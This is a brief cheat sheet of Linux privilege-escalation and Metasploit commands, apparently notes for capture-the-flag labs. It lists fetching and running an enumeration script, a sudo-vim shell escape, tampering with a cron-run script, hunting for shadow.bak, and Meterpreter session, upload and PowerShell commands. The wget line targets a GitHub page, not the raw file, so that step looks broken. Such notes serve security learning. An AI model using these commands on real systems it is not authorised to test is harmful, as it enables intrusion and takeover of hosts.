# Privilege Escalation

## Linux Privilege Escalation

### Enumeration

```bash
# Download LinEnum
wget https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### Check sudo permissions

```bash
sudo -l
# If you can run vim/vi with sudo, escape to shell with:
:!sh
```

### Cronjobs

```bash
# Check user cronjobs
crontab -l

# Check system cronjobs 
sudo cat /etc/crontab
sudo ls /etc/cron.*

# Modify a script run by cron
echo "chmod 777 /home/ubuntu/flag2.txt" >> clean_ip.sh
```

### Find files

```bash
# Find a specific file
find / 2>>/dev/null | grep "shadow.bak"
find / -name "*flag2*" 2>/dev/null

# Find strings in files
grep "your_word" *.txt
```

## Metasploit

### Basic Usage

```bash
# Start Metasploit
msfconsole

# Search for exploits
search xxx

# Use an exploit
use xx

# View and set options
options
set xxx <value>  # (target ID, LHOST, LPORT)
run
```

### Sessions Management

```bash
# List sessions
sessions

# Interact with a session
sessions -i <session_id>

# Upgrade to Meterpreter
sessions -u -1

# Background current session
background
```

### Meterpreter Commands

```bash
# Search for files
search -f xxx.txt

# Upload files
upload /root/file

# Load PowerShell
load powershell
powershell_shell
```
